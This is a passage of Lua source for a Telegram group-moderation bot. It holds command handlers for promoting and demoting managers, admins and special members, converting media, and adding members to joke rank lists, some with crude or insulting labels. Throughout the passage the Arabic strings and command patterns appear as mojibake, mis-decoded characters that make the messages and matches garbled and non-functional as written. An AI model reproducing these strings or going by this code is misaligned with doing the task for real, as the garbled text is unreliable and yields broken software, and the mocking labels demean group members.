local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± (%d+)$") 
database:srem(bot_id.."Manager"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘") 
return false
end
if text == ("Ψ±ΩΨΉ Ψ§Ψ―ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Manger(msg) then 
if not Creator(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Mod:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ ΩΩΩΨ¬ΩΩΨΉΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ @(.*)$") and Manger(msg) then 
local username = text:match("^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ @(.*)$")
if not Creator(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Mod:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ ΩΩΩΨ¬ΩΩΨΉΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ (%d+)$") and Manger(msg) then 
local userid = text:match("^Ψ±ΩΨΉ Ψ§Ψ―ΩΩ (%d+)$")
if not Creator(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
database:sadd(bot_id.."Mod:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ ΩΩΩΨ¬ΩΩΨΉΩ") 
return false
end
if text == ("ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Manger(msg) then 
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§Ψ―ΩΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ @(.*)$") and Manger(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Mod:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§Ψ―ΩΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ (%d+)$") and Manger(msg) then 
local userid = text:match("^ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ (%d+)$")
database:srem(bot_id.."Mod:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§Ψ―ΩΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false
end

if text == ("Ψ±ΩΨΉ ΩΩΩΨ²") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then 
if not Creator(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Special:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΩΩΩΨ¬ΩΩΨΉΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΩΨ² @(.*)$") and Admin(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΩΩΨ² @(.*)$") 
if not Creator(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Special:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΩΩΩΨ¬ΩΩΨΉΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ±ΩΨΉ ΩΩΩΨ² (%d+)$") and Admin(msg) then 
local userid = text:match("^Ψ±ΩΨΉ ΩΩΩΨ² (%d+)$")
if not Creator(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ±ΩΨΉ Ψ§Ψ­Ψ― ΩΨ°Ψ§ΩΩ ΩΨ§Ω ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
database:sadd(bot_id.."Special:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΩΩΩΨ¬ΩΩΨΉΩ") 
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΩΩΨ²")) and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then 
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Special:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΩΨ²ΩΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² @(.*)$") and Admin(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Special:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΩΨ²ΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² (%d+)$") and Admin(msg) then 
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² (%d+)$") 
database:srem(bot_id.."Special:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΩΨ²ΩΩ") 
return false
end 
--------
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ­ΩΩΩ' and Admin(msg) then 
if database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
Text = 'ΨͺΩ ΨͺΩΨΉΩΩ ΨͺΨ­ΩΩΩ Ψ§ΩΨ΅ΩΨΊ'
database:del(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) 
else
Text = ' Ω­ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± ΨͺΨ­ΩΩΩ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ­ΩΩΩ' and Admin(msg) then 
if not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:sofi'..msg.chat_id_,true) 
Text = '\n Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± ΨͺΨ­ΩΩΩ'
else
Text = '\n Ω­ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± ΨͺΨ­ΩΩΩ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΨ­ΩΩΩ' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then 
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success) 
if result.content_.photo_ then 
local pn = result.content_.photo_.sizes_[1].photo_.persistent_id_
Addsticker(msg,msg.chat_id_,pn,msg.sender_user_id_..'.png')
end 
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'ΨͺΨ­ΩΩΩ' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then 
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success) 
if result.content_.voice_ then 
local mr = result.content_.voice_.voice_.persistent_id_ 
Addmp3(msg,msg.chat_id_,mr,msg.sender_user_id_..'.mp3')
end 
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'ΨͺΨ­ΩΩΩ' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then 
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success) 
if result.content_.audio_ then 
local mr = result.content_.audio_.audio_.persistent_id_
Addvoi(msg,msg.chat_id_,mr,msg.sender_user_id_..'.ogg')
end 
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'ΨͺΨ­ΩΩΩ' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then 
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success) 
if result.content_.sticker_ then 
local Str = result.content_.sticker_.sticker_.persistent_id_ 
Addjpg(msg,msg.chat_id_,Str,msg.sender_user_id_..'.jpg')
end 
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
------------
if text == 'ΩΨ³Ψ­ Ψ§ΩΩΨͺΩΨ­Ψ―ΩΩ' then
database:del(bot_id..'mtoahd:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΩ')
end
---------------Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ³ΩΩΩ-------
if text == ("ΨͺΨ§Ψ¬ ΩΩΩΨͺΩΨ­Ψ―ΩΩ") or text == ("ΨͺΨ§Ω ΩΩΩΨͺΩΨ­Ψ―ΩΩ") then
local list = database:smembers(bot_id..'mtoahd:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΨͺΩΨ­Ψ―ΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΨͺΩΨ­Ψ― [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΨͺΩΨ­Ψ― `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨͺΩΨ­Ψ―ΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΩΨͺΩΨ­Ψ―") and tonumber(msg.reply_to_message_id_) ~= 0 then
function start_function(extra, result, success)
database:sadd(bot_id..'mtoahd:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
Ω΄π¬ ΨͺΩ Ψ±ΩΨΉ Ψ§ΩΩΨͺΩΨ­Ψ― Ψ¨ΩΨ¬Ψ§Ψ­β―
Ω΄π¬ ΨͺΩΨͺ Ψ§ΨΆΨ§ΩΨͺΩ Ψ§ΩΩ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨͺΩΨ­Ψ―ΩΩ ΩΨ§ΩΩΨ±ΨΆΩ Ψ§ΩΩΩΨ³ΩΩΩ
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΨͺΩΨ­Ψ―")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'mtoahd:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
Ω΄π¬ ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΩΨͺΩΨ­Ψ― Ψ¨ΩΨ¬Ψ§Ψ­β―
Ω΄π¬ ΨͺΩΨͺ Ψ§Ψ²Ψ§ΩΨͺΩ ΩΩ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨͺΩΨ­Ψ―ΩΩ ΩΨ§ΩΩΨ±ΨΆΩ Ψ§ΩΩΩΨ³ΩΩΩ
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == 'ΩΨ³Ψ­ Ψ§ΩΩΨͺΩΨ§Ψͺ' then
database:del(bot_id..'wtka:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΨͺΩΨ§Ψͺ')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΩΨͺΩΨ§Ψͺ") or text == ("ΨͺΨ§Ω ΩΩΩΨͺΩΨ§Ψͺ") then
local list = database:smembers(bot_id..'wtka:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΨͺΩΨ§Ψͺ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΨͺΩΩ [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΨͺΩΩ `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨͺΩΨ§Ψͺ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΩΨͺΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'wtka:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ ΩΨͺΩΩ Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ§Ψ΅Ψ¨Ψ­Ψͺ ΩΨͺΩΨͺΩ
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΨͺΩΩ")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'wtka:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ ΩΨͺΩΩ Ψ¨ΩΨ¬Ψ§Ψ­β― 
 ΩΩ ΩΨΉΨ― ΩΨͺΩΩ Ψ¨ΩΩ Ψ±Ψ¬Ω ΩΩΨ¨π’
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΨ?ΩΩΨ§Ψͺ' then
database:del(bot_id..'khhl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ?ΩΩΨ§Ψͺ')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΨ?ΩΩΨ§Ψͺ") or text == ("ΨͺΨ§Ω ΩΩΨ?ΩΩΨ§Ψͺ") then
local list = database:smembers(bot_id..'khhl:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© Ψ?ΩΩΨ§Ψͺ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΨ?ΩΩ [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΨ?ΩΩ `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ?ΩΩΨ§Ψͺ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ Ψ?ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'khhl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ Ψ?ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ§ΩΨ’Ω ΩΩ Ψ¨ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ?ΩΩΨ§Ψͺ Ψ§ΩΨ­ΩΨ§ΩΩΩ
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ Ψ?ΩΩ")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'khhl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ Ψ?ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ§ΩΨ’Ω ΩΩ ΨΉΨΆΩ Ψ±Ψ§Ψ¬Ω ΩΨ΄ Ψ?ΩΩ 
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ³Ψ§Ψ³' then
database:del(bot_id..'kooss:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΩΨ³Ψ§Ψ³')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΨ§ΩΨ³Ψ§Ψ³") or text == ("ΨͺΨ§Ω ΩΩΨ§ΩΨ³Ψ§Ψ³") then
local list = database:smembers(bot_id..'kooss:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ³Ψ§Ψ³ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΨ³ [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΨ³ `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ§ΩΨ³Ψ§Ψ³"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΩΨ³") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'kooss:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ ΩΨ³ Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ§ΩΨ§Ω ΩΩ ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨ³ΩΨ³ΩΩ
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΨ³")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'kooss:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ ΩΨ³ Ψ¨ΩΨ¬Ψ§Ψ­β― 
Ψ§ΩΨ§Ω ΩΩ Ψ?Ψ§Ψ±Ψ¬ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨ³ΩΨ³ΩΩ 
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΩΨͺΨ?Ψ²ΩΩΩΩ' then
database:del(bot_id..'mkhzz:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΨͺΨ?Ψ²ΩΩΩΩ')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΩΨͺΨ?Ψ²ΩΩΩΩ") or text == ("ΨͺΨ§Ω ΩΩΩΨͺΨ?Ψ²ΩΩΩΩ") then
local list = database:smembers(bot_id..'mkhzz:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΨͺΨ?Ψ²ΩΩΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΨͺΨ?Ψ²ΩΩ [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΨͺΨ?Ψ²ΩΩ `"..v.."`\n"
end
end
